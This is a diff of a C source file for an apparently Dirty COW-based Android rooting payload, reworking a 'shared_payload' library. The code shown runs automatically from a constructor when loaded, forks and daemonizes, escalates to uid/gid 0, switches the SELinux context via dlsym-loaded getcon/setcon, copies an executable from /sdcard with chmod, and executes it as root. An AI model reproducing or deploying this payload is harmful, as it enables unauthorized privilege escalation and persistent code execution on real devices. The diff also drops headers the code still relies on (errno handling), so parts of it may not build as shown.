@@ -2,15 +2,11 @@
 // Created by k.leyfer on 15.03.2017.
 //
 
-#include <errno.h>
-#include <unistd.h>
-#include <stdio.h>
 #include <stdlib.h>
+#include <unistd.h>
 #include <dlfcn.h>
-
-#include <android/log.h>
 #include <sys/stat.h>
-#include "dirty/file_utils/file_utils.h"
+#include <fcntl.h>
 #include "dirty/common/logging.h"
 
 #define EXEC_PAYLOAD_SDCARD_PATH "/sdcard/exec_payload"
@@ -20,20 +16,76 @@ typedef int getcon_t(char** con);
 
 typedef int setcon_t(const char* con);
 
-__attribute__((constructor)) void say_hello()
+int copy_file(const char* src_path, const char* dst_path)
 {
+  int src_fd = open(src_path, O_RDONLY);
+  if (src_fd == -1)
+  {
+    LOGV("unable to open %s: %s", src_path, strerror(errno));
+    return -1;
+  }
 
+  int dst_fd = open(dst_path, O_WRONLY | O_CREAT);
+  if (dst_fd == -1)
+  {
+    LOGV("unable to open %s: %s", dst_path, strerror(errno));
+    return -1;
+  }
+
+  int bufsize = 4096;
+  void* buf = (void*) malloc(bufsize);
+  int readed = 0;
+  do
+  {
+    readed = read(src_fd, buf, bufsize);
+    if (readed > 0)
+    {
+      int written = write(dst_fd, buf, readed);
+      LOGV("written %d", written);
+      if (written == -1)
+      {
+        LOGV("unable to write: %s", strerror(errno));
+        return -1;
+      }
+    }
+
+    LOGV("%d readed", readed);
+  } while (readed > 0);
+
+  close(src_fd);
+  close(dst_fd);
+  return 0;
+}
+
+int copy_file_with_mode(const char* src_path, const char* dst_path, int mode)
+{
+  if (copy_file(src_path, dst_path) == -1)
+  {
+    LOGV("Unable to copy file!");
+    return -1;
+  }
+
+  if (chmod(dst_path, mode) != 0)
+  {
+    LOGV("Unable to chmod %s: %s!", dst_path, strerror(errno));
+    return -1;
+  }
+
+  return 0;
+}
+
+int payload_main()
+{
   LOGV("%d: hi (%d)", getpid(), getuid());
 
   int orig_pid = getpid();
   pid_t pid = fork();
   if (pid == 0)
   {
-    LOGV("fork %d->%d", orig_pid, getpid());
+    daemon(0, 0);
 
     if (getuid() != 0)
     {
-      LOGV("running as uid %d\n", getuid());
       if (setresgid(0, 0, 0))
       {
         LOGV("setresgid failed: %s", strerror(errno));
@@ -63,7 +115,7 @@ __attribute__((constructor)) void say_hello()
     }
     else
     {
-      LOGV("Set groups OK!");
+      LOGV("set groups OK!");
     }
 
     dlerror();
@@ -76,24 +128,15 @@ __attribute__((constructor)) void say_hello()
     {
       void* getcon = dlsym(selinux, "getcon");
       const char* error = dlerror();
-      if (error)
-      {
-        LOGV("dlsym error %s", error);
-      }
-      else
+      if (!error)
       {
         getcon_t* getcon_p = (getcon_t*) getcon;
         char* secontext;
         int ret = (*getcon_p)(&secontext);
-        LOGV("current context: %d %s", ret, secontext);
 
         void* setcon = dlsym(selinux, "setcon");
         const char* error = dlerror();
-        if (error)
-        {
-          LOGV("dlsym setcon error %s", error);
-        }
-        else
+        if (!error)
         {
           setcon_t* setcon_p = (setcon_t*) setcon;
           if ((*setcon_p)("u:r:shell:s0") != 0)
@@ -114,15 +157,14 @@ __attribute__((constructor)) void say_hello()
 
     if (getuid() == 0)
     {
-      LOGV("Got root");
+      LOGV("root!");
 
       struct stat exec_payload_stat;
       if (stat(EXEC_PAYLOAD_DST_PATH, &exec_payload_stat) == -1)
       {
-        LOGV("Unable to stat %s: %s!", EXEC_PAYLOAD_DST_PATH, strerror(errno));
         if (errno == ENOENT)
         {
-          LOGV("Will copy exec_payload from /sdcard");
+          LOGV("Copy payload from /sdcard");
           if (stat(EXEC_PAYLOAD_SDCARD_PATH, &exec_payload_stat) == -1)
           {
             LOGV("Unable to open %s: %s!", EXEC_PAYLOAD_SDCARD_PATH, strerror(errno));
@@ -137,15 +179,6 @@ __attribute__((constructor)) void say_hello()
         }
       }
 
-      if (daemon(0, 0) == -1)
-      {
-        LOGV("Unable to daemonize process: %s!", strerror(errno));
-      }
-      else
-      {
-        LOGV("Run shared_payload as daemon!");
-      }
-
       if (execle(EXEC_PAYLOAD_DST_PATH, EXEC_PAYLOAD_DST_PATH, (char*) NULL, environ) == -1)
       {
         LOGV("Unable to exec payload: %s!", strerror(errno));
@@ -154,4 +187,20 @@ __attribute__((constructor)) void say_hello()
 
     exit(0);
   }
+  else
+  {
+    while (1) {
+      sleep(1);
+    }
+  }
+}
+
+int main(int argc, char const* argv[])
+{
+  return payload_main();
+}
+
+__attribute__((constructor)) void say_hello()
+{
+  payload_main();
 }
